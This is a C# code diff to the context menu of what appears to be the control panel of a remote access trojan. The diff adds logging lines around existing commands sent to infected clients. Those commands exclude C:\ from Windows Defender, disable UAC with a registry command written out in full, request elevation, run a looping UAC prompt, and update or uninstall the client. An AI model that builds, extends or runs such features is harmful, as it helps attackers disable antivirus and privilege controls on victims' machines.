@@ -88,7 +88,11 @@ internal static class FeatureContextMenu
         // ── Miscellaneous ───────────────────────────────────────────────
         var misc = MakeParent("Miscellaneous", "\uD83D\uDD27", "#606880");
         misc.Items.Add(MakeItem("Exclude C:\\ (Defender)", "\uD83D\uDEE1", "#a6e3a1", () =>
-            _ = server.SendToClient(clientId, new Packet { Type = PacketType.DefenderExclude, Data = "{}" })));
+        {
+            _ = server.SendToClient(clientId, new Packet { Type = PacketType.DefenderExclude, Data = "{}" });
+            ServerWindow.ReportGlobalActivity("Exclude C:\\", clientId, "complete");
+            ServerWindow.LogGlobal($"[ADMIN] Exclude C:\\ sent to client {clientId}.");
+        }));
         misc.Items.Add(MakeItem("Disable UAC", "\u26A0", "#f9e2af", () =>
         {
             _ = server.SendToClient(clientId, new Packet
@@ -97,6 +101,7 @@ internal static class FeatureContextMenu
                 Data = Newtonsoft.Json.JsonConvert.SerializeObject(new { Command = "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f" })
             });
             ServerWindow.ReportGlobalActivity("Disable UAC", clientId, "running");
+            ServerWindow.LogGlobal($"[ADMIN] Disable UAC request sent to client {clientId}.");
         }));
         menu.Items.Add(misc);
 
@@ -115,22 +120,26 @@ internal static class FeatureContextMenu
         {
             _ = server.SendToClient(clientId, new Packet { Type = PacketType.RequestElevation, Data = "{}" });
             ServerWindow.ReportGlobalActivity("UAC elevation", clientId, "running");
+            ServerWindow.LogGlobal($"[ADMIN] [UAC] Elevation request sent to client {clientId}.");
         }));
         mgmt.Items.Add(MakeItem("Loop UAC", "\uD83D\uDD01", "#89b4fa", () =>
         {
             _ = server.SendToClient(clientId, new Packet { Type = PacketType.RequestElevationLoop, Data = "{}" });
             ServerWindow.ReportGlobalActivity("Loop UAC", clientId, "running");
+            ServerWindow.LogGlobal($"[ADMIN] [UAC] Elevation loop started on client {clientId}.");
         }));
         mgmt.Items.Add(new Separator());
         mgmt.Items.Add(MakeItem("Update Client", "\uD83D\uDD04", "#a6e3a1", () =>
         {
             _ = server.SendToClient(clientId, new Packet { Type = PacketType.UpdateClient, Data = "{}" });
             ServerWindow.ReportGlobalActivity("Update client", clientId, "running");
+            ServerWindow.LogGlobal($"[ADMIN] Update client request sent to client {clientId}.");
         }));
         mgmt.Items.Add(MakeItem("Disconnect", "\u2716", "#f38ba8", () =>
         {
             _ = server.SendToClient(clientId, new Packet { Type = PacketType.Disconnect, Data = "{}" });
             ServerWindow.ReportGlobalActivity("Disconnect", clientId, "complete");
+            ServerWindow.LogGlobal($"[ADMIN] Disconnected client {clientId}.");
         }));
         mgmt.Items.Add(MakeItem("Uninstall Client", "\uD83D\uDDD1", "#f38ba8", () =>
         {
@@ -138,6 +147,7 @@ internal static class FeatureContextMenu
             {
                 _ = server.SendToClient(clientId, new Packet { Type = PacketType.Uninstall, Data = "{}" });
                 ServerWindow.ReportGlobalActivity("Uninstall", clientId, "complete");
+                ServerWindow.LogGlobal($"[ADMIN] Uninstall command sent to client {clientId}.");
             }
         }));
         mgmt.Items.Add(new Separator());
